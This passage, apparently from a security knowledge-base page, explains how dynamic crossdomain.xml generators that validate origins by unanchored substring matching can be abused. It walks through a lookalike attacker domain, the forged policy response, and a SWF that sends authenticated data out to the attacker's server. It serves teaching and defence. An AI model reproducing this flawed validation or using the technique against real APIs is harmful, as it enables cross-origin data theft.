    res.send('<?xml version="1.0"?><cross-domain-policy></cross-domain-policy>');
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API supports deep legacy interoperability, explicitly generating `crossdomain.xml` to permit cross-origin data reads for outdated desktop software and embedded emulators, \[2] The backend implements a dynamic reflection pipeline. Instead of a static XML file, the controller parses incoming HTTP headers to synthesize the policy on the fly, mimicking modern CORS behavior, \[3] The architecture relies on unanchored string analysis (`includes()`, `Contains()`) to validate the requester's domain ownership, \[4] The execution sink. Developers erroneously applied modern CORS validation heuristics to legacy authorization protocols. Legacy client parsers blindly trust the explicit domain string provided in the `<allow-access-from>` tag. By registering an external domain that structurally satisfies the loose backend validation (e.g., encapsulating the required substring), the attacker successfully coerces the backend into generating a mathematically valid, highly privileged authorization manifest. The legacy runtime ingests this poisoned XML, officially sanctioning the attacker's compiled binary to execute cross-origin reads against the authenticated enterprise session

```http
// 1. Attacker targets an enterprise API located at api.enterprise.tld.
// 2. Attacker reverse-engineers the dynamic crossdomain.xml endpoint and discovers the loose regex.
// 3. Attacker purchases the domain: enterprise.com.evil.net.
// 4. Attacker compiles a malicious SWF designed to execute an authenticated GET request to the API.
// 5. The victim opens the malicious SWF (hosted on enterprise.com.evil.net) via an emulator or thick client.

// 6. The runtime intercepts the SWF's outbound request and automatically fires the preflight policy check:
GET /crossdomain.xml HTTP/1.1
Host: api.enterprise.tld
Origin: https://enterprise.com.evil.net

// 7. The backend controller evaluates the Origin header.
//    "https://enterprise.com.evil.net".Contains("enterprise.com") == TRUE.
// 8. The backend dynamically synthesizes and returns the XML policy:

HTTP/1.1 200 OK
Content-Type: text/xml

<?xml version="1.0"?>
<cross-domain-policy>
    <allow-access-from domain="enterprise.com.evil.net" secure="true" />
</cross-domain-policy>

// 9. The legacy runtime parses the XML. It mathematically confirms that "enterprise.com.evil.net" 
//    is explicitly authorized by the target API.
// 10. The runtime executes the SWF's authenticated HTTP GET request.
// 11. The API returns the highly classified JSON data.
// 12. The SWF reads the HTTP response and transmits the data back to the attacker's command server.
```
{% endstep %}

{% step %}
To maintain interoperability with deprecated thick-clients and compiled legacy assets, engineers implemented dynamic backward-compatible policy generators. This architecture attempted to merge the rigid structural requirements of legacy XML policies with the flexible, dynamic resolution patterns of modern CORS middleware. The security failure emerged from an architectural context collision. Developers validated the incoming `Origin` headers utilizing unanchored substring heuristics—a vulnerability conceptually dangerous in CORS, but absolutely catastrophic when applied to legacy XML generation. The attacker exploited this by orchestrating an external domain name that fulfilled the substring requirement while remaining entirely hostile. When the legacy runtime requested authorization, the backend unwittingly synthesized an explicit, perfectly formatted XML policy granting the attacker's domain absolute read privileges. This architectural manipulation effectively resurrected legacy Cross-Site Flashing vulnerabilities, completely bypassing the enterprise's modern network security perimeters
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
